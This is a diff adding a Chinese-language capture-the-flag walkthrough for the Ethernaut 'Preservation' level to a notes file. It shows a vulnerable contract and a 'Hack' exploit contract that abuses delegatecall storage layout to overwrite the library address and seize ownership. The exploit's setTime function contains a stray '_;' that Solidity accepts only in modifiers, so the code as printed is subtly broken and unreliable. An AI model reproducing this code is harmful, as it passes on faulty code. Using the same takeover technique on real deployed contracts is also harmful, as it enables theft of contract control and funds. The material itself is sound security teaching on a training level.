@@ -1166,3 +1166,127 @@ contract NaughtCoin is ERC20 { // 基于 ERC20
 ### 参考资料
 
 [ERC 20 - OpenZeppelin Docs](https://docs.openzeppelin.com/contracts/2.x/api/token/erc20#ERC20-_mint-address-uint256-)
+
+## 16. Preservation
+
+声明对实例的所有权
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Preservation {
+
+  // public library contracts 
+  address public timeZone1Library;
+  address public timeZone2Library;
+  address public owner; 
+  uint storedTime;
+  // Sets the function signature for delegatecall
+  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
+
+  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
+    timeZone1Library = _timeZone1LibraryAddress; 
+    timeZone2Library = _timeZone2LibraryAddress; 
+    owner = msg.sender;
+  }
+ 
+  // set the time for timezone 1
+  function setFirstTime(uint _timeStamp) public {
+    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+  }
+
+  // set the time for timezone 2
+  function setSecondTime(uint _timeStamp) public {
+    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+  }
+}
+
+// Simple library contract to set the time
+contract LibraryContract {
+
+  // stores a timestamp 
+  uint storedTime;  
+
+  function setTime(uint _time) public {
+    storedTime = _time; // 修改了第一个状态变量
+  }
+}
+```
+
+- `delegatecall` 只使用给定地址的代码，其他属性（存储、余额等）都取自当前合约，因此，调用 `delegatecall` 合约的存储布局必须和被调用合约保持一致
+- 先利用 `setFirstTime` 修改合约 `Preservation` 的第一个状态变量，即 `timeZone1Library` 的值为合约 `Hack` 的地址，再调用 `setFirstTime` 函数，此时将执行合约 `Hack` 中的代码
+    - `timeZone1Library` 如果修改错误则无法进行后续步骤，此时再重新申请一个实例
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Preservation {
+
+  address public timeZone1Library;
+  address public timeZone2Library;
+  address public owner; 
+  uint storedTime;
+  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
+
+  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
+    timeZone1Library = _timeZone1LibraryAddress; 
+    timeZone2Library = _timeZone2LibraryAddress; 
+    owner = msg.sender;
+  }
+
+  function setFirstTime(uint _timeStamp) public {
+    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+  }
+
+  function setSecondTime(uint _timeStamp) public {
+    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
+  }
+}
+
+contract LibraryContract {
+
+  uint storedTime;  
+
+  function setTime(uint _time) public {
+    storedTime = _time;
+  }
+}
+
+contract Hack {
+  // Make sure the storage layout is the same as Preservation
+  // This will allow us to correctly update the state variables
+  address public timeZone1Library;
+  address public timeZone2Library;
+  address public owner; 
+  uint storedTime;
+
+  Preservation preservation;
+
+  constructor(address instance) public {
+      preservation = Preservation(instance);
+  }
+
+  function attack() public {
+      // override address of timeZone1Library
+      preservation.setFirstTime(uint(uint160(address(this))));
+      // change the owner
+      preservation.setFirstTime(1);
+  }
+
+  // function signature must match LibraryContract.setTimeSignature
+  function setTime(uint _) public {
+      owner = tx.origin;
+      _;
+  }
+}
+```
+
+- 库应使用 `library` 来声明
+- `library` 与 `contract` 类似，但不能声明任何状态变量或向其发送以太
+
+### 参考资料
+
+- [Delegatecall | Solidity by Example](https://solidity-by-example.org/hacks/delegatecall/)
+- [Library | Solidity by Example](https://solidity-by-example.org/library/)
